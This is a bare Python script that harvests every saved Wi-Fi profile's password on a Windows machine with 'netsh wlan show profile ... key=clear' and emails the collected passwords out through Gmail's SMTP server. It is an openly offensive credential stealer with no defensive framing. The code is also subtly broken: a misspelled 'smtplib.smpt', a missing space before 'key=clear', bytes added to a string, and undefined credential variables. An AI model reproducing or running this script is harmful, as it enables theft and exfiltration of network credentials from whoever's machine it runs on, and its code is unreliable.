import subprocess
import smtplib
import re

command1 = "netsh wlan show profile"
networks = subprocess.check_output(command1,shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)', str(networks))


final_output = " "
for network in network_list:
    command2 = ("netsh wlan show profile " + str(network) + "key=clear")
    one_network_result = subprocess.check_output(command2, shell=True)
    final_output += one_network_result


server = smtplib.smpt("smtp.gmail.com", 587)
server.starttls()
server.login(your_email,your_password)
server.sendmail(your_email, your_email, final_output)
server.quit()
                
